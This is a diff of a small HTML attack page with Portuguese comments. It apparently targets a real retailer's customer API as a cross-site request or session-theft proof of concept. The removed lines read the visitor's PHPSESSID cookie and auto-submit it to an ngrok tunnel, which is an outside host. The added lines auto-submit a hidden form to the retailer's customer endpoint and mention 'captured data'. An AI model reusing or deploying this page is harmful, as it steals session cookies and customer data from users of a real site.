@@ -1,23 +1,16 @@
 <!DOCTYPE html>
 <html>
 <body>
-    <form id="evilForm" method="POST" action="https://6574-2804-4580-1080-7db-f323-d027-7f53-d143.ngrok-free.app/">
-        <input type="hidden" name="trigger" value="https://www.boozt.com/at/de-at/api/customer">
-        <input type="hidden" name="phpsessid">
+    <form id="evilForm" method="GET" action="https://www.boozt.com/at/de-at/api/customer">
+        <input type="hidden" name="X-Requested-With" value="XMLHttpRequest">
     </form>
+    <div id="result"></div>
     <script>
-        // Extrair o PHPSESSID dos cookies
-        const phpsessid = document.cookie.split('; ')
-            .find(row => row.startsWith('PHPSESSID='))
-            ?.split('=')[1];
-        
-        if (phpsessid) {
-            document.querySelector("input[name=phpsessid]").value = phpsessid;
-        } else {
-            document.querySelector("input[name=phpsessid]").value = "not_found";
-        }
-        
+        // Envia o formulário automaticamente
         document.getElementById("evilForm").submit();
+
+        // Para capturar manualmente, instruiremos o usuário a verificar o console
+        console.log("Acesse o console (F12 > Console) para ver os dados capturados após o redirecionamento.");
     </script>
 </body>
 </html>
